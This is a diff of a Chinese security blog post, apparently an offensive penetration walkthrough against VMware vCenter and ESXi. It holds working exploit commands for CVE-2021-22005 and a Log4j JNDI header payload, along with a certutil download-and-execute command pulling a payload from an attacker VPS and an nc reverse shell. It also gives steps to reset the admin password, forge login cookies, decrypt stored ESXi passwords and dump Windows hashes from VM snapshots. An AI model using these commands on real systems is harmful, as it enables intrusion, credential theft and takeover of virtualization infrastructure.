+<p><a target="_blank" rel="noopener" href="https://github.com/rwincey/CVE-2021-22005/blob/main/CVE-2021-22005.py">https://github.com/rwincey/CVE-2021-22005/blob/main/CVE-2021-22005.py</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-<span class="number">2021</span>-<span class="number">22005</span>.py -t https:<span class="comment">//x.x.x.x</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-82ad078909b942162f90c1ebaeaa801e4a739eeb.png" alt="image-20220813190026044.png"></p>
+<p>连接webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//x.x.x.x/idm/..;/test.jsp</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2a58627c60e7afc64a7ff5852c35add37a5a30cb.png" alt="image-20220813185938630.png"></p>
+<p>上传后的webshell完整路径为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/xx.jsp</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05-CVE-2021-44228"><a href="#0x05-CVE-2021-44228" class="headerlink" title="0x05 CVE-2021-44228"></a>0x05 CVE-2021-44228</h1><p>利用log4j漏洞，漏洞触发点为XFF头部</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">121.137</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Dnt: 1</span></span><br><span class="line"><span class="comment">X-Forwarded-For: $&#123;jndi:ldap://9qphlt.dnslog.cn&#125;</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: none</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment">Te: trailers</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure>
+
+<p>DNSlog探测漏洞是否存在</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-<span class="keyword">For</span>: $&#123;jndi:ldap:<span class="comment">//9qphlt.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a9cec220ce57579231dd1299a825d5f910847abd.png" alt="image-20220902150833322.png"></p>
+<p>使用 JNDIExploit 工具，<code>-u</code> 查看可执行命令</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c5109ee11cd47a1f42546136e8c1073ba3314609.png" alt="image-20220902152302899.png"></p>
+<p>漏洞利用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-<span class="number">1.3</span>-SNAPSHOT.jar -i VPSIP</span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: $&#123;jndi:ldap:<span class="comment">//VPSIP:1389/TomcatBypass/TomcatEcho&#125;</span></span><br><span class="line">cmd:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-de44a89636b00e57bfc361f51b20cf3bc6a24306.png" alt="image-20220902152705873.png"><br><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b16b8fc8ce5bf2d90afee85dd77d709602f82054.png" alt="image-20220902151954111.png"></p>
+<p>cs上线</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">121.142</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Dnt: 1</span></span><br><span class="line"><span class="comment">cmd: certutil -urlcache -split -f http://VPS C:\Users\Public\1.exe &amp;amp;&amp;amp; C:\Users\Public\1.exe</span></span><br><span class="line"><span class="comment">X-Forwarded-For: $&#123;jndi:ldap://VPS:1389/TomcatBypass/TomcatEcho&#125;</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: none</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment">Te: trailers</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-1068158a10b3a438807208ce7e9995916e5b2382.png" alt="image-20220902155509783.png"></p>
+<p>Linux使用反弹shell命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh <span class="number">10.10</span>.<span class="number">10.10</span> <span class="number">8888</span></span><br><span class="line">nc -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p>弹回来若是非交互式shell没有回显，使用以下命令切换为交互式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0c02bcea53d29f1dcc604d4d02e2f61a1590bd97.png" alt="image-20220902161936653.png"></p>
+<h1 id="0x06-获取vcenter-web控制台权限"><a href="#0x06-获取vcenter-web控制台权限" class="headerlink" title="0x06 获取vcenter-web控制台权限"></a>0x06 获取vcenter-web控制台权限</h1><h2 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h2><p>比较快的一种方法，但是修改之后无法获取原来的密码，管理员会发现密码被改</p>
+<p>选择 3 选项，输入默认 <a href="mailto:administrator@vsphere.local">administrator@vsphere.local</a> （需要管理员权限）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux </span></span><br><span class="line">/usr/lib/vmware-vmdir/bin/vdcadmintool </span><br><span class="line"></span><br><span class="line"><span class="comment">#Windows </span></span><br><span class="line">C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ec55781e81c4dc199cc3320976acea1f342ff522.png" alt="image-20220829144257277.png"></p>
+<h2 id="cookie登录"><a href="#cookie登录" class="headerlink" title="cookie登录"></a>cookie登录</h2><p>通过解密数据库登录获取cookie，再用cookie登录web</p>
+<p>解密脚本：<a target="_blank" rel="noopener" href="https://github.com/horizon3ai/vcenter_saml_login">https://github.com/horizon3ai/vcenter_saml_login</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vcenter_saml_login.py -p data.mdb -t <span class="number">10.9</span>.<span class="number">16.11</span> </span><br></pre></td></tr></table></figure>
+
+<p>然后会生成相应的cookie，访问 <code>ui</code> 路径进行 cookie 替换即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux</span></span><br><span class="line">/storage/db/vmware-vmdir/data.mdb</span><br><span class="line"></span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line">C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6661eb592e614bb7eb227a04ce148565e50975f9.png" alt="image-20220824120811883.png"><br>使用小饼干替换cookie，成功登录<br><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-79bdcc7a3b6f83fd6c4788e334534b26c9f9b266.png" alt="image-20220824134338223.png"><br>windows运行脚本需要安装对应版本的python-ldap</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap1</span></span><br><span class="line">pip install python_ldap-<span class="number">3.4</span>.<span class="number">0</span>-cp38-cp38-win_amd64.whl</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2ad5d2d3125ce692197ced645d3df4660d7b8145.png" alt="image-20220824120857075.png"><br><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d96ab1b0e22d1725d2cd3455ed2a937d1ed27b00.png" alt="image-20220824120622726.png"><br>实际测试过程中发现windows的data.mdb文件过大，拉回来不是那么方便，适合Linux机器</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-250de43c99725ca4f12afe30a57e4a350b67ed07.png" alt="image-20220824114156587.png"><br>这时候如果目标机器上装有python环境，可使用3gstudent师傅的脚本进行利用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py">https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vCenter_ExtraCertFromMdb.py data.mdb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-4619bf0737ffdd59d73a223ba385b0a3cf835504.png" alt="image-20220829120100199.png"></p>
+<p>运行脚本会生成三段证书文件，放置到相应的位置</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py">https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vCenter_GenerateLoginCookie.py <span class="number">192.168</span>.<span class="number">121.135</span> <span class="number">192.168</span>.<span class="number">121.135</span> vsphere.local idp_cert.txt trusted_cert_1.txt trusted_cert_2.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-202ffc37ef1c16616eb80800a3afbf4933f0b177.png" alt="image-20220829142148838.png"></p>
+<h2 id="不重置获取密码（ESXI）"><a href="#不重置获取密码（ESXI）" class="headerlink" title="不重置获取密码（ESXI）"></a>不重置获取密码（ESXI）</h2><p>查看域</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux</span></span><br><span class="line">/usr/lib/vmware-vmafd/bin/vmafd-cli get-domain-name --server-name localhost</span><br><span class="line"></span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line">C:\Program Files\VMware\vCenter Server\vmafdd\vmafd-cli get-domain-name --server-name localhost</span><br><span class="line">C:\PROGRA~<span class="number">1</span>\VMware\<span class="string">&quot;vCenter Server&quot;</span>\vmafdd\vmafd-cli get-domain-name --server-name localhost</span><br></pre></td></tr></table></figure>
+
+<p>坑点：由于路径中间存在空格，导致识别不了</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-547953d25071a5ded4f9fe0a36ec1271cf0719f9.png" alt="image-20220815103945952.png"><br>解决方法：使用双引号对含有空格的路径进行单独处理</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-fd5f28e6c0e350611fd408e28c3ea62be0cb9246.png" alt="image-20220815104048896.png"></p>
+<h3 id="1、获取解密key"><a href="#1、获取解密key" class="headerlink" title="1、获取解密key"></a>1、获取解密key</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Windows</span></span><br><span class="line">type C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat</span><br><span class="line"></span><br><span class="line"><span class="comment">#Linux</span></span><br><span class="line">cat /etc/vmware-vpx/ssl/symkey.dat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-416d9551fd7fc500ce00e07afaa68f8ea2857966.png" alt="image-20220813161905824.png"></p>
+<h3 id="2、获取数据库账号密码"><a href="#2、获取数据库账号密码" class="headerlink" title="2、获取数据库账号密码"></a>2、获取数据库账号密码</h3><p>vcenter默认数据库文件存放在vcdb.properties，配置文件中有数据库的明文账号密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux</span></span><br><span class="line">cat /etc/vmware-vpx/vcdb.properties</span><br><span class="line">cat /etc/vmware/service-state/vpxd/vcdb.properties</span><br><span class="line"></span><br><span class="line"><span class="comment">#Windows</span></span><br><span class="line">type C:\ProgramData\VMware\<span class="string">&quot;VMware VirtualCenter&quot;</span>\vcdb.properties</span><br><span class="line">type C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2941c7d4897a9f6c8f558372d0e38626164e97a3.png" alt="image-20220813184742819.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3b90201348bc0b855105a0d8bbaea4f1eee01d13.png" alt="image-20220813191535308.png"></p>
+<p>默认是postgresql数据库，只能在vCenter服务器本地登录，执行语句查询ESXI的密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#psql默认存放位置</span></span><br><span class="line">Windows: C:\Program Files\VMware\vCenter Server\vPostgres\bin\psql.exe</span><br><span class="line">Linux: /opt/vmware/vpostgres/<span class="number">9.3</span>/bin/psql</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行语句查询</span></span><br><span class="line">psql -h <span class="number">127.0</span>.<span class="number">0.1</span> -p <span class="number">5432</span> -U vc -d VCDB -c <span class="string">&quot;select ip_address,user_name,password from vpx_host;&quot;</span> &amp;gt; password.enc</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行完会输出一段加密字段</span></span><br><span class="line">Command&amp;gt; shell psql -h <span class="number">127.0</span>.<span class="number">0.1</span> -p <span class="number">5432</span> -U vc -d VCDB -c <span class="string">&quot;select ip_address,user_name,password from vpx_host;&quot;</span> &amp;gt; password.enc</span><br><span class="line">Shell access is granted to root</span><br><span class="line">Password <span class="keyword">for</span> user vc: </span><br><span class="line">ip_address  | user_name |                                         password                                      </span><br><span class="line">-------------+-----------+---------------------------------------------------------------------------------------</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.1</span> | vpxuser   | *H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg==</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.2</span> | vpxuser   | *zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q==</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.3</span> | vpxuser   | *Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw==</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.4</span> | vpxuser   | *R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA==</span><br><span class="line">(<span class="number">4</span> rows)</span><br><span class="line"></span><br><span class="line"><span class="comment">#只保留password字段</span></span><br><span class="line">*H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg==</span><br><span class="line">*zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q==</span><br><span class="line">*Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw==</span><br><span class="line">*R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA==</span><br></pre></td></tr></table></figure>
+
+<p>在实际情况中也碰到使用 MSSQL 数据库的情况，这时候直接使用 navicat 进行连接，搜索 <code>VPX_HOST</code> 表</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-fea62ebb4aef3c89a4299b30bb8508b11b83fbbc.png" alt="image-20220815144326190.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6d53bc3bf138dee12dfaca4de4114aa92ad4838b.png" alt="image-20220815141131592.png"></p>
+<h3 id="3、使用脚本解密"><a href="#3、使用脚本解密" class="headerlink" title="3、使用脚本解密"></a>3、使用脚本解密</h3><p><a target="_blank" rel="noopener" href="https://github.com/shmilylty/vhost_password_decrypt">https://github.com/shmilylty/vhost_password_decrypt</a></p>
+<ul>
+<li>password字段放到password.enc里面</li>
+<li>symkey.dat为第一步获取的解密key</li>
+</ul>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-af6bfe36a7e72790134c4642412fb4a8e531fd48.png" alt="image-20220815134235378.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python decrypt.py symkey.dat password.enc password.txt</span><br></pre></td></tr></table></figure>
+
+<p>执行脚本后，会输出一个password.txt，里面存放着对应 ip_address 的 ESXI 机器密码</p>
+<h3 id="4、登录ESXI"><a href="#4、登录ESXI" class="headerlink" title="4、登录ESXI"></a>4、登录ESXI</h3><p>在 ESXI 机器地址后面添加 <code>/ui</code> ，访问web控制台，账密为 <code>vpxuser/password.txt里的密码</code></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e12f8370c5250949431467ed72ccf5c54ada4c40.png" alt="image-20220815132316991.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-98c6f4dd7a23d1eb6a79482a0f99e830849ec084.png" alt="image-20220815135054173.png"><br>解密出来的密码除了可以登录web控制台以外还可以ssh登录机器，不过需要服务里开启 SSH 安全shell</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e3664b8577928c49ee2531d362c2d604a743ac90.png" alt="image-20220815143721321.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-9bc82bbe9595b2b9f511646d3be57d1130854eb3.png" alt="image-20220824135257496.png"></p>
+<h1 id="0x07-获取虚拟机权限"><a href="#0x07-获取虚拟机权限" class="headerlink" title="0x07 获取虚拟机权限"></a>0x07 获取虚拟机权限</h1><p>登录web控制台后，想要获取某个虚拟机的权限，比如说目标系统为靶标</p>
+<p>选择目标虚拟机，操作生成快照</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0d9f53815495ae22684a7027552dd9d1a94c2f53.png" alt="image-20220901170459802.png"><br>到数据存储位置找到相应的快照文件</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7148d3728ea7ae3c6d18f5b480d001fb609d2cb8.png" alt="image-20220901150507397.png"><br>也可以通过 ssh 登录ESXI服务器上，通过 find 找出相应的 <code>vmem</code> 和 <code>vmsn</code> 文件拷贝到本地</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*.vmem&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e0bf047d26039746e099a46625408943596595b8.png" alt="image-20220901163008934.png"><br><a target="_blank" rel="noopener" href="https://www.volatilityfoundation.org/releases">https://www.volatilityfoundation.org/releases</a></p>
+<p>使用 volatility 工具查看 profile</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.<span class="number">6</span>_win64_standalone.exe -f WindowsServer2008r2.vmem imageinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d21d629314ed0df42fce54b274358c24352eea83.png" alt="image-20220901165506218.png"><br>读取注册表</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.<span class="number">6</span>_win64_standalone.exe -f WindowsServer2008r2.vmem --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-47e120be2b0b7a76cd4bd3156dc878aaa40c7ce6.png" alt="image-20220901170657774.png"><br>获取hash并解出密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.<span class="number">6</span>_win64_standalone.exe -f WindowsServer2008r2.vmem --profile=Win7SP1x64 hashdump -y <span class="number">0xfffff8a000024010</span> -s <span class="number">0xfffff8a00084c010</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d2a6267cfca41b6b3dfda107d713ee7dd9843cf9.png" alt="image-20220901170740133.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3597c5317a6c96684d2ea584ae24c3500f651b91.png" alt="image-20220901155122168.png"></p>
 
       
 
-    </div>
-    <div class="article-info article-info-index">
       
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关//" class="article-tag-list-link color5">开发相关</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关/elk//" class="article-tag-list-link color4">elk</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>祝老板天天开心<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Elasticsearch基础（一）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/11/08/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/">Elasticsearch基础（一）</a>
-    </h1>
-  
-
-        
-        <a href="/2022/11/08/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2022-11-08T15:06:47.472Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="elasticsearch基础（一）"><a href="#elasticsearch基础（一）" class="headerlink" title="elasticsearch基础（一）"></a>elasticsearch基础（一）</h1><p>CRUD 功能，然而 Elasticsearch 的核心功能是搜索，所以在学习之前，为更好的演示这个功能，我们先往 Elasticsearch 中插入一些数据：</p>
-        
-          <a class="article-more-a" href="/2022/11/08/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关//" class="article-tag-list-link color5">开发相关</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/开发相关/elk//" class="article-tag-list-link color4">elk</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/11/08/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
